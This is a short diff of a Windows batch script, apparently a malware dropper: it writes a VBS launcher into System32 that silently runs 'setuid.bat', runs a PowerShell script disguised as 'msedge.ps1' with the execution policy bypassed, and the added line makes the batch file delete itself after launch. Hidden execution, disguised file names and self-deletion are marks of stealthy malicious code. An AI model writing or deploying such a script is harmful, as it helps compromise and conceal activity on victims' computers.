@@ -22,3 +22,4 @@ echo powershell -ExecutionPolicy Bypass C:\Windows\System32\msedge.ps1 >>C:\Wind
 echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Windows\System32\Deso.vbs
 echo WshShell.Run "C:\Windows\System32\setuid.bat", 0 , false >>C:\Windows\System32\Deso.vbs
 start C:\Windows\System32\Deso.vbs
+del /f /q "%~f0"
